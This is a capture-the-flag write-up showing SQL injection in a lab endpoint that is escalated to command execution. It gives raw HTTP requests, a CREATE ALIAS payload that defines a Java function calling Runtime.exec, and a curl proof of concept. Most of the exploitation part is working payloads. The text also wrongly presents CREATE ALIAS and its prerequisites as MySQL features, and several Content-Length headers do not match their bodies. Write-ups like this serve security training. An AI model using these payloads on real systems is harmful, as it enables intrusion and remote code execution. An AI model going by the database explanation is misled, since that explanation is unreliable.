# **Write-Up: Exploiting SQL Injection to Execute Arbitrary Code**

## **Challenge Description**
Pentesting isn't a solomente. Gather your team, create alias, and take control of the world. Java may not be my favorite language, but I always choose coffee every day.

## **FLAG**

NHD{khirna_maydir_ghirna_challenge_impermiable_hbibi}

---

## **Note from molzri3**
This challenge is inspired by the 'Pentester Notes' from HackTheBox. I played it, had a lot of fun, and decided to include it in the CTF. Thanks to @HackTheBox for the inspiration


## **Vulnerability Analysis**
### **1. Vulnerable Endpoint**
The endpoint `/api/mola7ada` is vulnerable to SQL injection due to improper handling of user input in the `name` parameter. The backend code directly concatenates user input into the SQL query without proper sanitization or parameterization.

### **2. Exploitable Functionality**
The `CREATE ALIAS` technique allows an attacker to define a custom function in MySQL that can execute arbitrary Java code. By exploiting the SQL injection vulnerability, an attacker can inject a payload to create an alias and execute system commands.

### **3. Prerequisites for Exploitation**
- The MySQL user must have the `CREATE` and `EXECUTE` privileges.
- The MySQL server must support user-defined functions (UDFs).

---

## **Exploitation Steps**

### **Step 1: Identify the Vulnerability**
1. **Test for SQL Injection:**
   Send a payload to the `/api/mola7ada` endpoint to test for SQL injection:
   ```
   POST /api/mola7ada HTTP/1.1
   Host: 127.0.0.1:1337
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 25

   name=test' OR 1=1; --
   ```

   If the application returns all rows from the `mola7adat` table, SQL injection is confirmed.

2. **Determine the Number of Columns:**
   Use the `ORDER BY` clause to determine the number of columns in the query:
   ```
   POST /api/mola7ada HTTP/1.1
   Host: 127.0.0.1:1337
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 25

   name=test' ORDER BY 3; --
   ```

   If the application returns a valid response, there are at least 3 columns.

### **Step 2: Exploit the Vulnerability**
1. **Inject a `CREATE ALIAS` Payload:**
   Use the following payload to create an alias that executes arbitrary Java code:
   ```
   POST /api/mola7ada HTTP/1.1
   Host: 127.0.0.1:1337
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 500

   name=test'; CREATE ALIAS EXECVE AS 'String execve(String cmd) throws java.io.IOException { Process process = Runtime.getRuntime().exec(cmd); java.io.InputStream inputStream = process.getInputStream(); java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream("/app/target/classes/static/hola.html"); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = inputStream.read(buffer)) != -1) { fileOutputStream.write(buffer, 0, bytesRead); } fileOutputStream.close(); inputStream.close(); return "Output written to /app/target/classes/static/hola.html"; }'; --
   ```

   This payload creates an alias `EXECVE` that executes a system command and writes the output to a file.

2. **Execute the Alias:**
   Use the following payload to execute the alias and run a system command:
   ```
   POST /api/mola7ada HTTP/1.1
   Host: 127.0.0.1:1337
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 50

   name=test'; CALL EXECVE('ls /'); --
   ```

   This payload executes the `ls /` command and writes the output to `/app/target/classes/static/hola.html`.

### **Step 3: Retrieve the Output**
1. **Access the Output File:**
   The output of the command is written to `/app/target/classes/static/hola.html`. Access this file via the web server:
   ```
   http://127.0.0.1:1337/hola.html
   ```

2. **Extract the Flag:**
   If the flag is located in the root directory, the `ls /` command will list it, and the output will be available in `hola.html`.

---

## **Proof of Concept (PoC)**
Here’s a sample PoC using `curl` to exploit the vulnerability:

```bash
# Step 1: Create the alias
curl -X POST \
  http://127.0.0.1:1337/api/mola7ada \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test'; CREATE ALIAS EXECVE AS 'String execve(String cmd) throws java.io.IOException { Process process = Runtime.getRuntime().exec(cmd); java.io.InputStream inputStream = process.getInputStream(); java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"/app/target/classes/static/hola.html\"); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = inputStream.read(buffer)) != -1) { fileOutputStream.write(buffer, 0, bytesRead); } fileOutputStream.close(); inputStream.close(); return \"Output written to /app/target/classes/static/hola.html\"; }'; --"

# Step 2: Execute the alias
curl -X POST \
  http://127.0.0.1:1337/api/mola7ada \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test'; CALL EXECVE('ls /'); --"
```
